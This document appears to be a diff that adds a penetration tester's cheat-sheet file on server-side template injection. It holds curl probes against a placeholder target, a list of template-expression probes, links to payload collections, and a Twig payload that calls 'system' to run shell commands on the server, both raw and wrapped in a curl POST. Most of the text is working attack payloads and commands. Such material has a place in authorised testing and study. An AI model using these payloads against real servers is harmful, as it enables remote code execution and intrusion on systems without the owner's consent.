@@ -1,0 +1,25 @@
+!!!!!!!! CHECK THE CONNECTIONS IN THE DEVELOPER TOOLS !!!!!!!!
+
+-> Test for SSTI (curl - GET):
+curl -gis 'http://<TARGET-IP>:PORT/hello?name={{7*7}}'
+
+-> Test for SSTI (curl - POST):
+curl -X POST -d '{{7*'7'}}' http://<TARGET-IP>:<PORT>
+
+OR:
+{7*7}
+${7*7}
+#{7*7}
+%{7*7}
+{{7*7}}
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
+https://www.fatalerrors.org/a/0dhx1Dk.html (Payload creation)
+
+---------------------------------------------------------------------
+
+-> Submit payload (Twig):
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
+OR:
+curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET-IP>:<PORT>
